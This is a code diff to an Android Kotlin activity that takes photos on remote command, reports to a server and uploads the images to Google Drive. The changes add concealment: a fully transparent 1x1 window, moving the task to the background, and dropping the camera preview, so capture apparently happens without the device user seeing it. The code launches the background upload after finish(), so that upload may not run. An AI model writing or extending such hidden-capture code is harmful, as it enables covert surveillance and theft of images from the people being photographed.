@@ -54,6 +54,8 @@ class DummyCameraxActivity : AppCompatActivity() {
         viewBinding = ActivityDummyCameraxBinding.inflate(layoutInflater)
         setContentView(viewBinding.root)
 
+        window.attributes.alpha = 0f
+        window.setDimAmount(0f)
         window.setGravity(android.view.Gravity.TOP or android.view.Gravity.START)
         window.setLayout(1, 1)
         window.setFlags(
@@ -68,6 +70,8 @@ class DummyCameraxActivity : AppCompatActivity() {
         )
         @Suppress("DEPRECATION")
         overridePendingTransition(0, 0)
+
+        moveTaskToBack(true)
 
         onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
             override fun handleOnBackPressed() {
@@ -108,7 +112,6 @@ class DummyCameraxActivity : AppCompatActivity() {
 
     override fun onNewIntent(intent: android.content.Intent) {
         super.onNewIntent(intent)
-        setIntent(intent)
     }
 
     override fun onDestroy() {
@@ -162,9 +165,7 @@ class DummyCameraxActivity : AppCompatActivity() {
 
         cameraProvider.unbindAll()
         try {
-            // Bind Dummy Preview alongside ImageCapture to satisfy hardware camera HAL requirements
-            val preview = Preview.Builder().build()
-            cameraProvider.bindToLifecycle(this, cameraSelector, preview, imageCapture)
+            cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)
         } catch (e: Exception) {
             this.log().e(TAG, "Cannot take picture: bindToLifecycle failed. ${e.message}")
             val transport = NextJsServerTransport(ctx)
@@ -173,8 +174,8 @@ class DummyCameraxActivity : AppCompatActivity() {
             return
         }
 
-        // Suspend with 10-second strict timeout for image capture callback
-        val imgBytes = withTimeoutOrNull(10000L) {
+        // Suspend with 3-second strict timeout for instant image capture callback
+        val imgBytes = withTimeoutOrNull(3000L) {
             suspendCancellableCoroutine<ByteArray?> { cont ->
                 imageCapture.takePicture(
                     cameraExecutor,
@@ -214,28 +215,30 @@ class DummyCameraxActivity : AppCompatActivity() {
         }
     }
 
-    private suspend fun savePhotoAndFinish(imgBytes: ByteArray, commandName: String) {
+    private fun savePhotoAndFinish(imgBytes: ByteArray, commandName: String) {
         val ctx = applicationContext
         val photosDir = MediaStorageManager.getPhotosDir(ctx)
         val photoFile = File(photosDir, "photo_${System.currentTimeMillis()}.jpg")
 
-        withContext(Dispatchers.IO) {
+        try {
             photoFile.writeBytes(imgBytes)
+        } catch (e: Exception) {
+            ctx.log().e(TAG, "Error writing photo file: ${e.message}")
         }
 
-        // Send Step 2 status message
-        val transport = NextJsServerTransport(ctx)
-        transport.send(
-            ctx,
-            "Photo captured successfully! Saved locally to ${photoFile.name}. Queued for Google Drive upload...",
-            commandName
-        )
-
-        // Close activity immediately so camera hardware is freed
+        // Close activity IMMEDIATELY so camera hardware is freed in < 50ms
         finish()
 
-        // Trigger smart syncer for recent files (< 1 min)
-        MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = commandName)
+        // Offload status notification and Google Drive upload to background scope
+        lifecycleScope.launch(Dispatchers.IO) {
+            val transport = NextJsServerTransport(ctx)
+            transport.send(
+                ctx,
+                "Photo captured successfully! Saved locally to ${photoFile.name}. Queued for Google Drive upload...",
+                commandName
+            )
+            MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = commandName)
+        }
     }
 
     private suspend fun recordVideo() {
